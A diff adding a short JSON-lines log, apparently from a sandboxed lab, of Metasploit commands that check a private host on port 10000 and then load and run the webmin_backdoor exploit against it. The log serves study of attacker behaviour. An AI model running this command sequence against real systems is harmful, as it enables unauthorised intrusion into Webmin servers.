@@ -1,0 +1,10 @@
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T06:57:52.593Z", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T06:58:54.132Z", "cmd_type": "msf-command", "cmd": "check 10.1.26.9/10000"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:00:21.490Z", "cmd_type": "msf-command", "cmd": "check"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:00:47.909Z", "cmd_type": "msf-command", "cmd": "banner"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:01:53.540Z", "cmd_type": "msf-command", "cmd": "use"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:02:45.990Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:04:22.421Z", "cmd_type": "msf-command", "cmd": "check"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:05:52.718Z", "cmd_type": "msf-command", "cmd": "exploit -j"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:06:31.067Z", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "129", "timestamp_str": "2021-06-30T07:08:19.347Z", "cmd_type": "msf-command", "cmd": "set RHOST 10.1.26.9"}
